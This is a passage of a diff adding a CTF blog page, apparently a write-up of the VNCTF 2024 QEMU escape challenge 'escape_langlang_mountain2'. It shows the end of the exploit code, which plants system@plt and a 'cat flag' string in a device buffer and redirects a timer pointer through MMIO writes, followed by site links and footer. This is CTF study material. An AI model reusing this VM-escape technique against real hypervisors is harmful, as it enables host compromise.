+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">timer_list</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">system_plt</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">system_plt</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="p">(</span><span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">28</span><span class="p">,</span> <span class="p">(</span><span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">44</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mh">0x20746163</span><span class="p">);</span> <span class="c1">// cat\x20</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="mh">0x67616c66</span><span class="p">);</span> <span class="c1">// flag</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>          <span class="c1">// \0</span>
+
+    <span class="c1">// 劫持 target</span>
+    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">timer_ptr</span> <span class="o">-</span> <span class="n">buf_addr</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[-]offset: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+
+  </div>
+    
+      <b>本博客上与 pwn 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2024/07/24/CISCN-Final-2024.html">CISCN Final 2024</a></li>
+        
+          <li><a href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html">BlackHatMEA 2023 House of Minho</a></li>
+        
+          <li><a href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html">VNCTF 2024 escape_langlang_mountain2</a></li>
+        
+          <li><a href="/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a></li>
+        
+          <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+    
+      <b>本博客上与 qemu 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html">VNCTF 2024 escape_langlang_mountain2</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
